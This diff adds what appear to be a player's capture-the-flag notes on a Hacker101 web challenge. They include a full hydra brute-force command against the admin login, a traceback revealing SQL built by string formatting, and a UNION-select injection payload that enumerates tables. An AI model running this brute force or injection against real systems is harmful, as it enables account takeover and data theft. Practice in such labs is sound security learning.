@@ -1,0 +1,21 @@
+/login:
+- Credentials
+	- username: admin
+	- password: <brute force this>
+	- hydra -l admin -P /usr/share/wordlists/fasttrack.txt 30bbcecafc81fa7b27625fe355278cb8.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -o scans/hydra_admin_pw -t 4 -vV
+
+/ticket:
+- queryparams: ?id=1
+=> invalid id returns some error code:
+Traceback (most recent call last):
+  File "./main.py", line 79, in ticket
+    title, body, reply = cur.fetchone()
+TypeError: 'NoneType' object is not iterable
+==> sql injectable:
+cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
+
+mariadb:
+- -1 union select table_name,2,3 from information_schema.tables
+
+/newUser:
+- queryparams: ?username=test&password=test&password2=test
